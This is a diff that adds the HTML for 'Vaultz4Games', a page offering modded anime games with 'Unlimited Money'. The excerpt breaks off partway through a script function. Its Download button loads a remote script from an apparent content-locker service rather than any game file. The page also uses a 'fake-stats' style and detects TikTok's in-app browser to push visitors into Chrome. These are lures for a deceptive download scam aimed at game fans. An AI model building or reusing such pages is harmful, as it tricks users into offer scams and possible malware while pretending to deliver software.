@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vaultz4Games</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+body {
+  margin:0;
+  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background:#0f0f0f url('https://www.transparenttextures.com/patterns/dark-mosaic.png') repeat;
+  background-attachment:fixed;
+  color:#f0f0f0;
+}
+.container { max-width:1200px; margin:0 auto; padding:20px;}
+header { text-align:center; padding:20px 20px 10px 20px;}
+header h1 { font-size:2.3rem; color:#ff6f00; margin-bottom:8px; border-bottom: 4px solid #ff6f00; display: inline-block; padding-bottom:5px;}
+header p { color:#ccc; font-size:1rem; margin-top:5px;}
+.game-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:20px; margin-top:30px; padding:10px; }
+.game-card { background:#1e1e1e; border-radius:12px; overflow:hidden; cursor:pointer; transition:0.3s; height:230px; position:relative; box-shadow: 0 5px 15px rgba(0,0,0,0.5); border: 1px solid rgba(255,111,0,0.3); padding:5px;}
+.game-card:hover { transform:translateY(-5px);}
+.game-card img { width:100%; height:150px; object-fit:cover; transition:0.3s;}
+.game-card .info { display:flex; justify-content:space-between; align-items:center; padding:8px 12px;}
+.game-card .info h3 { margin:0; color:#fff; font-size:1rem;}
+.game-card .info span { color:#ff6f00; font-weight:bold; font-size:0.9rem;}
+.game-card .coming-soon.red { color:red; font-weight:bold; font-size:0.9rem; position:absolute; top:10px; left:10px;}
+.game-card .mod-label { display:block; margin-top:5px; background: linear-gradient(45deg, #1e90ff, #32cd32); color:#fff; font-size:0.8rem; font-weight:bold; text-align:center; border-radius:8px; padding:2px 5px;}
+.game-info { display:none; padding:20px; background:rgba(30,30,30,0.95); border-radius:12px; box-shadow: 0 8px 30px rgba(0,0,0,0.7);}
+.platform-banner { text-align:center; background: rgba(255, 158, 74, 0.2); color: #ffb74d; font-weight:bold; padding: 8px 0; border-radius: 8px; margin:25px 0 15px 0; font-size:1.2rem;}
+.platform-banner i { margin-right:8px; color:#ff9800;}
+.separator-line { border:1px solid rgba(255,183,77,0.3); margin:25px 0; border-radius:2px;}
+.video-container { position:relative; padding-bottom:56.25%; height:0; overflow:hidden; border-radius:10px; margin:15px 0;}
+.video-container iframe { position:absolute; top:0; left:0; width:100%; height:100%; border:none; border-radius:10px;}
+.download-btn, .how-btn, .back-btn { margin-top:10px; cursor:pointer; border-radius:50px; padding:10px 25px; font-weight:bold; position:relative; }
+.download-btn { background:linear-gradient(45deg,#ff6f00,#ff8c00); color:#fff; border:none; }
+.download-btn span.loading { display:none; position:absolute; right:10px; top:50%; transform:translateY(-50%); width:16px; height:16px; border:2px solid #fff; border-top:2px solid transparent; border-radius:50%; animation:spin 1s linear infinite;}
+@keyframes spin { 0%{transform:translateY(-50%) rotate(0deg);} 100%{transform:translateY(-50%) rotate(360deg);} }
+.how-btn { background:#555; color:#fff; border:none; margin-left:10px;}
+.back-btn { background:#333; color:#fff; border:none; padding:10px 20px; margin-bottom:20px;}
+.instruction-text { display:none; background:#222; padding:15px; border-radius:10px; margin-top:10px; color:#ccc;}
+.back-bottom { margin-top:30px; display:inline-block; }
+.fake-stats { display:flex; justify-content:space-between; align-items:center; padding:5px 0; font-size:0.9rem; color:#ffb74d; margin-top:10px;}
+.fake-stats i { margin-right:5px;}
+.search-bar { text-align:center; margin-top:10px;}
+.search-bar input { width:80%; max-width:400px; padding:8px 12px; border-radius:50px; border:none; }
+
+/* Overlay */
+#browserOverlay {
+  position:fixed; top:0; left:0; width:100%; height:100%;
+  background:rgba(0,0,0,0.95); color:#fff; display:flex; flex-direction:column;
+  justify-content:center; align-items:center; text-align:center; padding:20px; z-index:9999;
+  font-family:Arial, sans-serif;
+}
+#browserOverlay h2 { font-size:1.8rem; color:#ff6f00; margin-bottom:10px; }
+#browserOverlay p { font-size:1.1rem; margin-bottom:10px; color:#ccc; }
+#browserOverlay button { padding:12px 25px; font-size:1rem; border:none; border-radius:50px; background:#ff6f00; color:#fff; cursor:pointer; margin-top:10px; }
+#browserOverlay #thankText { margin-top:20px; font-size:1rem; color:#32cd32; display:none; }
+#browserOverlay img { max-width:100px; margin-bottom:15px; }
+</style>
+</head>
+<body>
+
+<!-- Overlay -->
+<div id="browserOverlay">
+  <img src="https://upload.wikimedia.org/wikipedia/en/0/09/TikTok_logo.svg" alt="TikTok Logo">
+  <h2>Open in Browser</h2>
+  <p>For the best experience and working downloads, please open this page in <strong>Google Chrome</strong>.</p>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Google_Chrome_icon_%282011%29.png" alt="Google Chrome">
+  <p>If nothing happens automatically, click the menu (⋮) in TikTok and select "Open in Browser".</p>
+  <button id="openBrowserBtn">OK, Open in Chrome</button>
+  <p id="thankText">✅ Thank you! You can continue.</p>
+</div>
+
+<!-- ORIGINAL HTML START -->
+<div class="container">
+<header>
+    <h1>Vaultz4Games</h1>
+    <p>100% working anime & top games for PC & Mobile — all the best titles in one place!</p>
+</header>
+
+<div class="search-bar">
+  <input type="text" placeholder="Search games...">
+</div>
+
+<div class="game-grid">
+  <div class="game-card" onclick="showGame('demon')">
+    <img src="https://demonslayer-hinokami.sega.com/img/purchase/digital-standard.jpg" alt="Demon Slayer">
+    <div class="info"><h3>Demon Slayer</h3><span>PC/Mobile</span></div>
+  </div>
+  <div class="game-card" onclick="showGame('naruto')">
+    <img src="https://sm.ign.com/ign_in/screenshot/default/naruto-ultimate-ninja-storm-cover_rbhk.jpg" alt="Naruto">
+    <div class="info"><h3>Naruto</h3><span>Mobile</span></div>
+    <span class="mod-label">Mod - Unlimited Money</span>
+  </div>
+  <div class="game-card" onclick="showGame('onepiece')">
+    <img src="https://www.latestmodapks.com/wp-content/uploads/2023/04/ONE-PIECE-Bounty-Rush-1.webp" alt="One Piece">
+    <div class="info"><h3>One Piece</h3><span>Mobile</span></div>
+    <span class="mod-label">Mod - Unlimited Money</span>
+  </div>
+  <div class="game-card" onclick="showGame('solo')">
+    <img src="https://gaming-cdn.com/images/products/19526/orig/solo-leveling-arise-overdrive-pc-steam-cover.jpg?v=1756394713" alt="Solo Leveling">
+    <div class="info"><h3>Solo Leveling</h3><span class="coming-soon red">Coming Soon</span></div>
+    <span class="mod-label">Mod - Unlimited Money</span>
+  </div>
+</div>
+
+<!-- Game info sections kept exactly as in your HTML -->
+<div id="demon" class="game-info">
+  <!-- Demon Slayer content from your original HTML -->
+</div>
+
+<div id="naruto" class="game-info">
+  <!-- Naruto content from your original HTML -->
+</div>
+
+<div id="onepiece" class="game-info">
+  <!-- One Piece content from your original HTML -->
+</div>
+
+<div id="solo" class="game-info">
+  <button class="back-btn" onclick="goBack()">Go Back</button>
+  <h2>Solo Leveling</h2>
+  <span class="mod-label">Mod - Unlimited Money</span>
+  <p><span class="coming-soon red">Coming Soon</span></p>
+  <div class="video-container"><iframe src="https://www.youtube.com/embed/_2JT1Vdlsio" allowfullscreen></iframe></div>
+  <button class="download-btn" onclick="showLoading(this); loadScriptDelayed('solo-script','https://lockedapp.net/cl/js/n623pk',2000)">
+    <i class="fas fa-download"></i> Download
+    <span class="loading"></span>
+  </button>
+  <div id="solo-script"></div>
+  <button class="back-btn back-bottom" onclick="goBack()">Go Back</button>
+</div>
+<!-- ORIGINAL HTML END -->
+
+<script>
+// Overlay behavior
+document.addEventListener('DOMContentLoaded', function() {
+  const overlay = document.getElementById('browserOverlay');
+  const btn = document.getElementById('openBrowserBtn');
+  const thank = document.getElementById('thankText');
+
+  const ua = navigator.userAgent || "";
+  if (/TikTok/i.test(ua)) {
+    overlay.style.display = 'flex'; // show overlay only in TikTok
+  } else {
+    overlay.style.display = 'none'; // hide for normal browsers
+  }
+
+  btn.addEventListener('click', function() {
+    thank.style.display = 'block'; // show thank you text
+    setTimeout(()=>{ overlay.style.display = 'none'; }, 2000); // hide overlay
+  });
+});
+
+// Page scripts
+function showGame(id){
+    document.querySelector('.game-grid').style.display = 'none';
+    document.querySelectorAll('.game-info').forEach(el => el.style.display = 'none');
+    const page = document.getElementById(id);
+    page.style.display = 'block';
+    window.scrollTo(0,0);
+}
+function goBack(){
+    document.querySelector('.game-grid').style.display = 'grid';
+    document.querySelectorAll('.game-info').forEach(el => el.style.display = 'none');
+}
+function toggleInstructions(id){
+    const el = document.getElementById(id);
+    el
